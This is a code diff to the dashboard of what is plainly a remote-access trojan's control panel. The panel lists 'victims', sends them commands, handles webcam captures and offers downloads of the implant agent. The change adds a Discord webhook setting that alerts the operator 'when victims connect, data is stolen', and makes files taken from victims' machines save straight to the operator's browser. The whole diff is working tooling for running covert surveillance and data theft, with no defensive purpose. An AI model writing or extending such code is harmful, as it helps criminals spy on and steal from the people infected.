@@ -6,6 +6,13 @@ import {
   Badge,
   Button,
   CounterBadge,
+  Dialog,
+  DialogActions,
+  DialogBody,
+  DialogContent,
+  DialogSurface,
+  DialogTitle,
+  DialogTrigger,
   Input,
   Spinner,
   Tab,
@@ -33,7 +40,7 @@ import { ProcessManager } from "@/components/ui/ProcessManager";
 import { VictimInfo } from "@/components/ui/VictimInfo";
 import { ConnectionBadge } from "@/components/ui/ConnectionBadge";
 import { LogoutDialog } from "@/components/ui/LogoutDialog";
-import { getVictims, sendCommand, disconnectVictim, downloadMyAgent } from "@/lib/api";
+import { getVictims, sendCommand, disconnectVictim, downloadMyAgent, getMyWebhook, updateMyWebhook } from "@/lib/api";
 import { useWebSocket } from "@/lib/websocket";
 import { useAuth } from "@/lib/auth";
 import { useBreakpoint } from "@/lib/useBreakpoint";
@@ -167,6 +174,9 @@ export function DashboardContainer({
   const [loading, setLoading] = useState(initialVictims.length === 0);
   const [search, setSearch] = useState("");
   const [activeTab, setActiveTab] = useState<string>("terminal");
+  const [webhookDialogOpen, setWebhookDialogOpen] = useState(false);
+  const [webhookUrl, setWebhookUrl] = useState("");
+  const [webhookSaving, setWebhookSaving] = useState(false);
   const hasInitialData = useRef(initialVictims.length > 0);
 
   // Per-victim data for tabs
@@ -235,9 +245,26 @@ export function DashboardContainer({
         } else {
           setOutput((p) => [
             ...p,
-            `[file] ${msg.filename} (${msg.size} bytes)`,
-            `%%FILE%%${msg.filename}%%${msg.data}`,
+            `[download] ${msg.filename} (${msg.size} bytes) — saving...`,
           ]);
+          // Trigger browser download
+          try {
+            const raw = atob(msg.data);
+            const bytes = new Uint8Array(raw.length);
+            for (let i = 0; i < raw.length; i++) bytes[i] = raw.charCodeAt(i);
+            const blob = new Blob([bytes], { type: "application/octet-stream" });
+            const url = URL.createObjectURL(blob);
+            const a = document.createElement("a");
+            a.href = url;
+            a.download = msg.filename || "download";
+            document.body.appendChild(a);
+            a.click();
+            document.body.removeChild(a);
+            URL.revokeObjectURL(url);
+            setOutput((p) => [...p, `[download] ✓ ${msg.filename} saved`]);
+          } catch {
+            setOutput((p) => [...p, `[download] Failed to save file`]);
+          }
         }
       } else if (msg.type === "webcam_result") {
         if (msg.error) {
@@ -500,6 +527,63 @@ export function DashboardContainer({
               {!isMobile ? "Admin" : undefined}
             </Button>
           )}
+          <Button
+            appearance="subtle"
+            size="small"
+            icon={<SettingsRegular />}
+            onClick={async () => {
+              if (!token) return;
+              try {
+                const url = await getMyWebhook(token);
+                setWebhookUrl(url);
+              } catch { /* ignore */ }
+              setWebhookDialogOpen(true);
+            }}
+          >
+            {!isMobile ? "Webhook" : undefined}
+          </Button>
+          <Dialog open={webhookDialogOpen} onOpenChange={(_, d) => setWebhookDialogOpen(d.open)}>
+            <DialogSurface>
+              <DialogBody>
+                <DialogTitle>Discord Webhook</DialogTitle>
+                <DialogContent>
+                  <Text block style={{ marginBottom: 8, fontSize: 12, color: tokens.colorNeutralForeground3 }}>
+                    Get notified on Discord when victims connect, data is stolen, etc.
+                  </Text>
+                  <Input
+                    placeholder="https://discord.com/api/webhooks/..."
+                    value={webhookUrl}
+                    onChange={(_, d) => setWebhookUrl(d.value)}
+                    style={{ width: "100%" }}
+                  />
+                </DialogContent>
+                <DialogActions>
+                  <DialogTrigger disableButtonEnhancement>
+                    <Button appearance="secondary" size="small">Cancel</Button>
+                  </DialogTrigger>
+                  <Button
+                    appearance="primary"
+                    size="small"
+                    disabled={webhookSaving}
+                    onClick={async () => {
+                      if (!token) return;
+                      setWebhookSaving(true);
+                      try {
+                        await updateMyWebhook(token, webhookUrl);
+                        setWebhookDialogOpen(false);
+                      } catch (e) {
+                        alert(e instanceof Error ? e.message : "Failed to save webhook");
+                      } finally {
+                        setWebhookSaving(false);
+                      }
+                    }}
+                  >
+                    {webhookSaving ? "Saving..." : "Save"}
+                  </Button>
+                </DialogActions>
+              </DialogBody>
+            </DialogSurface>
+          </Dialog>
           <Button
             appearance="subtle"
             size="small"
